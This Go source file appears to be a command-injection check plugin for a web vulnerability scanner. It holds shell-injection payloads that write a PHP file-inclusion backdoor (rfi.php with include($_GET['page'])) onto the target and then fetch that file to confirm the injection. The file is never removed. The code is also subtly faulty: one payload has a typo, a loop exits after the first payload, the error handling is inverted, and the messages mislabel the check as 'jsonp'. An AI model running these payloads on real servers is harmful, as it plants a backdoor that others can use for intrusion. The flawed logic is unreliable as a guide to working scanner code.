package cmdinject

import (
	"errors"
	"fmt"
	"glint/logger"
	"glint/nenet"
	"glint/pkg/layers"
	"glint/plugin"
	"glint/util"
	"net/http"
	"strings"
	"time"

	"github.com/valyala/fasthttp"
)

// const (
// 	phpinject = "phpinjectds"
// )

var cert string
var mkey string

type CallbackCheck func(args ...interface{}) (bool, error)

var DefaultProxy = ""

var payload_page = []string{
	`| echo "<?php include($_GET['page'])| ?>" > rfi.php`,
	`; echo "<?php include($_GET['page']); ?>" > rfi.php`,
	`& echo "<?php include($_GET['page']); ?>" > rfi.php`,
	`&& echo "<?php include($_GET['page']); ?>" > rfi.php`,
}

func cmd1(args ...interface{}) (bool, error) {
	var url string
	for _, arg := range args {
		if value, ok := arg.(string); ok {
			url = value
		}
	}
	resp, err := http.DefaultClient.Get(url + "/" + "rfi.php")
	if err != nil {
		return false, errors.New("not found cmd1 inject")
	}
	if resp.StatusCode == 200 {
		return true, nil
	}
	return false, errors.New("not found cmd1 inject")
}

func fast_send_poc(payloads []string,
	url string,
	headers map[string]string,
	method string,
	ContentType string,
	callback CallbackCheck,
) (
	req1 *fasthttp.Request,
	resp1 *fasthttp.Response,
	err error) {
	sess := nenet.GetSessionByOptions(
		&nenet.ReqOptions{
			Timeout:       2 * time.Second,
			AllowRedirect: true,
			Proxy:         DefaultProxy,
			Cert:          cert,
			PrivateKey:    mkey,
		})
	if strings.ToUpper(method) == "POST" {
		for _, body := range payloads {
			req1, resp1, errs := sess.Post(url, headers, []byte(body))
			if errs != nil {
				continue
				// return nil, nil, errs
			}
			b, err := callback(url)
			if b {
				return req1, resp1, err
			}
		}
	} else {
		for _, payload_url := range payloads {
			req1, resp1, errs := sess.Get(payload_url, headers)
			if errs != nil {
				continue
			}
			b, err := callback(req1, resp1)
			if b {
				return req1, resp1, err
			}
		}
	}
	return nil, nil, errors.New("not found cmd1 inject")
}

// 检测是否执行echo "xxxx" > rfi.php 此命令
func cmd_mkdir(url string, method string, headers map[string]string, body []byte, ContentType string) (*fasthttp.Request,
	*fasthttp.Response, error) {
	params, err := util.ParseUri(url, body, method, ContentType)
	if err != nil {
		logger.Debug(err.Error())
		return nil, nil, fmt.Errorf(err.Error())
	}
	for _, payload := range payload_page {
		payloads := params.SetPayload(url, payload, method)
		req, resp, err := fast_send_poc(payloads, url, headers, method, ContentType, cmd1)
		if err != nil {
			return req, resp, nil
		} else {
			return req, resp, err
		}
	}
	return nil, nil, errors.New("not found cmd1 inject")
}

func CmdValid(args interface{}) (*util.ScanResult, bool, error) {
	//group := args.(plugin.GroupData)
	// ORIGIN_URL := `http://not-a-valid-origin.xsrfprobe-csrftesting.0xinfection.xyz`
	var Param layers.PluginParam
	ct := layers.CheckType{}
	Param.ParsePluginParams(args.(plugin.GroupData), ct)
	if Param.CheckForExitSignal() {
		return nil, false, errors.New("receive task exit signal")
	}

	// sess := nenet.GetSessionByOptions(
	// 	&nenet.ReqOptions{
	// 		Timeout:       time.Duration(Param.Timeout) * time.Second,
	// 		AllowRedirect: false,
	// 		Proxy:         Param.UpProxy,
	// 		Cert:          Param.Cert,
	// 		PrivateKey:    Param.CertKey,
	// 	})

	req, resp, err := cmd_mkdir(Param.Url, Param.Method, Param.Headers, []byte(Param.Body), Param.ContentType)
	if err != nil {
		return nil, false, fmt.Errorf("check jsonp error: %v", err)
	}
	if req != nil && resp.StatusCode() == 200 {
		Result := util.VulnerableTcpOrUdpResult(Param.Url,
			"cmd inject vulnerability found",
			[]string{string(req.String())},
			[]string{string(resp.String())},
			"high",
			Param.Hostid)

		return Result, false, err
	}
	return nil, false, errors.New("jsonp vulnerability not found")
}
